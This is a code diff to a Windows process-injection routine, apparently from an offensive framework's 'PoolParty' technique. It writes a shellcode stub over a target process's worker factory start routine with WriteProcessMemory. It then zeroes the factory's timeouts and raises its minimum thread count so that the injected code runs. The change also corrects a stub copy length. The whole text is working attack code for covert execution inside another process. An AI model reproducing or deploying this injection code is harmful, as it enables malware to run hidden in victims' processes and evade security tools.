@@ -314,7 +314,7 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		else {
 			unsigned char tmp[] = {0xeb, 0x03, 0x58, 0xff, 0x10, 0xe8, 0xf8, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00};
 			unsigned __int32 StubAddress = (unsigned __int32)((uintptr_t)lpStartAddress);
-			memcpy(shellcode, &tmp, 18);
+			memcpy(shellcode, &tmp, 14);
 			memcpy(shellcode + 10, &StubAddress, sizeof(StubAddress));
 		}
 		unsigned char OriginalBytes[18] = { 0x00 };
@@ -325,6 +325,18 @@ DWORD worker_factory_start_routine_overwrite(HANDLE hProcess, DWORD dwDestinatio
 		SIZE_T szWritten = 0;
 		if (!WriteProcessMemory(hProcess, WorkerFactoryBasicInfo.StartRoutine, shellcode, 18, &szWritten) || szWritten != sizeof(shellcode)) {
 			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] WriteProcessMemory failed, couldn't write stub to WorkerFactory's start routine.", ERROR_NOT_SUPPORTED);
+		}
+		WorkerFactoryBasicInfo.Timeout.QuadPart = 0x00;
+		WorkerFactoryBasicInfo.IdleTimeout.QuadPart = 0x00;
+		dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryTimeout, &WorkerFactoryBasicInfo.Timeout, sizeof(LARGE_INTEGER));
+		dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryTimeout returned 0x%x", dwResult);
+		if (dwResult != STATUS_SUCCESS) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryTimeout failed.", ERROR_NOT_SUPPORTED);
+		}
+		dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryIdleTimeout, &WorkerFactoryBasicInfo.IdleTimeout, sizeof(LARGE_INTEGER));
+		dprintf("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryIdleTimeout returned 0x%x", dwResult);
+		if (dwResult != STATUS_SUCCESS) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty][worker_factory_start_routine_overwrite] NtSetInformationWorkerFactory for WorkerFactoryTimeout failed.", ERROR_NOT_SUPPORTED);
 		}
 		WorkerFactoryBasicInfo.ThreadMinimum++; //Increase minimum thread number to create a new thread.
 		dwResult = pNtDll->pNtSetInformationWorkerFactory(hDuplicatedHandle, WorkerFactoryThreadMinimum, &WorkerFactoryBasicInfo.ThreadMinimum, sizeof(ULONG));
